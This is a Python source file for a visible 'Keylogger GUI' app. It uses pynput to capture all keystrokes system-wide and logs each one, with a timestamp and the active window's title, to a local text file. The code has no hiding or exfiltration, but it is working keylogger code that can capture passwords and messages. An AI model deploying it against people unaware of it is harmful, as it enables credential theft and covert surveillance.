import customtkinter as ctk
from pynput import keyboard
import pygetwindow as gw
import time
from datetime import datetime
import threading

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger GUI")
        self.root.geometry("500x300")

        self.root.configure(bg="#2c3e50")

        # Use CustomTkinter Textbox (for display and logging)
        self.text_box = ctk.CTkTextbox(root, height=100, width=500, corner_radius=10, border_width=2)
        self.text_box.pack(padx=10, pady=10)

        # Start Logging Button
        self.start_button = ctk.CTkButton(root, text="Start Logging", command=self.start_logging, width=150, height=40, corner_radius=8)
        self.start_button.pack(pady=5)

        # Stop Logging Button
        self.stop_button = ctk.CTkButton(root, text="Stop Logging", command=self.stop_logging, width=150, height=40, corner_radius=8, state=ctk.DISABLED)
        self.stop_button.pack(pady=5)

        # Clear Log Button
        self.clear_button = ctk.CTkButton(root, text="Clear Log", command=self.clear_log, width=150, height=40, corner_radius=8)
        self.clear_button.pack(pady=5)

        self.listener = None
        self.is_logging = False
        self.log_file = 'keystrokes.txt'

        # To capture and log words
        self.current_word = ''
        self.last_key_time = time.time()
        self.debounce_time = 0.5  # 500ms debounce

    def get_active_window(self):
        """Get the active window's name using pygetwindow"""
        try:
            window = gw.getActiveWindow()
            if window:
                return window.title
            return "Unknown"
        except Exception as e:
            return f"Error: {e}"

    def on_press(self, key):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        application = self.get_active_window()

        try:
            key_char = key.char
        except AttributeError:
            key_char = str(key)

        # Capture the keystroke
        self.current_word += key_char

        # Display it in the text box
        self.text_box.insert(ctk.END, key_char)  # Changed to ctk.END

        # Save the keystroke to the log file with timestamp and application
        with open(self.log_file, 'a') as file:
            file.write(f'{timestamp} | {application} | {key_char}\n')


        # Check if enough time has passed to treat the keystroke as part of the word
        if time.time() - self.last_key_time > self.debounce_time:
            # Log the word after debounce period
            if self.current_word:
                with open(self.log_file, 'a') as file:
                    file.write(f'{timestamp} | {application} | Word: {self.current_word}\n')

                self.current_word = ''  # Reset the word buffer

        self.last_key_time = time.time()

    def on_release(self, key):
        if key == keyboard.Key.esc:
            self.stop_logging()

    def start_logging(self):
        self.is_logging = True
        self.start_button.configure(state=ctk.DISABLED)
        self.stop_button.configure(state=ctk.NORMAL)

        # Start the keylogger in a separate thread to avoid blocking the GUI
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        threading.Thread(target=self.listener.start).start()

    def stop_logging(self):
        self.is_logging = False
        self.start_button.configure(state=ctk.NORMAL)
        self.stop_button.configure(state=ctk.DISABLED)

        if self.listener:
            self.listener.stop()

    def clear_log(self):
        self.text_box.delete(1.0, ctk.END)
        with open(self.log_file, 'w') as file:
            file.truncate(0)  # Clear the file content

if __name__ == "__main__":
    # Initialize CustomTkinter Window
    root = ctk.CTk()
    app = KeyloggerApp(root)
    root.mainloop()
